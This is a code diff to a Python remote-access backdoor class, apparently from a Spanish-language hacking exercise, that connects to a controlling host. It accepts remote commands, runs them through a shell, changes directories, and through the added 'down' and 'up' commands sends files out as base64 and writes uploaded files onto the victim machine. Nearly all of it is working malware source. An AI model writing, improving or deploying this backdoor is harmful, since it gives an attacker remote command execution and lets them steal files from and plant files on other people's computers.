@@ -3,6 +3,7 @@ import socket
 import subprocess
 import json
 import os
+import re
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -24,34 +25,50 @@ class Backdoor:
         while True:
         #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
         #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
-        #Así aseguramos la integridad de los mismos
+        #Así aseguramos la integridad de los mismos.
             '''try:
-                jsonData = self.connection.recv(1024)
+                jsonData = self.connection.recv(4096)                
                 return json.loads(jsonData.decode('utf-8'))
-
-            except ValueError: continue'''
-            jsonData = self.connection.recv(1024)
-            return json.loads(jsonData.decode('utf-8'))
+            
+            except ValueError: 
+                print('Está ocurriendo un error')
+                continue'''
+            jsonData = self.connection.recv(4096)                
+            return json.loads(jsonData)
     
     def runCommand(self, command):
         try:
             return subprocess.check_output(command, shell=True)
             
         except subprocess.CalledProcessError:
-            return '[-] Comado no reconocido o error en el valor de salida'
+            return '[-]Comado no reconocido o error en el valor de salida'
 
     def changeDirectory(self, path):
         try:
             os.chdir(path)
-            return f'[+] Cambiando a {path}'
+            return f'[+]Cambiando a {path}'
 
         except (FileNotFoundError, OSError): 
-            return '[-] El sistema no puede encontrar la ruta especificada'
+            return '[-]El sistema no puede encontrar la ruta especificada'
     
+    
+    def writeFile(self, path, route, content):
+        try:
+            contentToWrite = base64.b64decode(content)
+            if contentToWrite != b'[-]Archivo no encontrado':
+                with open(f'{route}{path}', 'wb') as file:
+                    file.write(contentToWrite)
+                    return b'[+]Descarga completa'
+            else: return b'[-]Descarga fallida'
+        except FileNotFoundError:
+            return b'Archivo no encontrado'
     
     def readFile(self, path):
-        with open(path, 'rb') as file:
-            return base64.b64encode(file.read())
+        try:
+            with open(path, 'rb') as file:
+                return base64.b64encode(file.read())
+        except FileNotFoundError:
+            return base64.b64encode(b'[-]Archivo no encontrado')
     
     def run(self):
         try:
@@ -64,8 +81,13 @@ class Backdoor:
                 elif command[0] == 'cd' and len(command) > 1:
                     commandResults = self.changeDirectory(' '.join(command[1:]))
 
-                elif command[0] == 'descargar':
-                    commandResults = self.readFile(' '.join(command[1:]))
+                elif command[0] == 'down':
+                    commandResults = self.readFile(' '.join(command[2:]))
+
+                elif command[0] == 'up':
+                    path = re.sub('/.*/.*?/', '', ' '.join(command[3:]))
+                    self.writeFile(path, command[2], command[1])
+                    commandResults = b'[+]Archivo subido'
 
                 else: 
                     commandResults = self.runCommand(command)
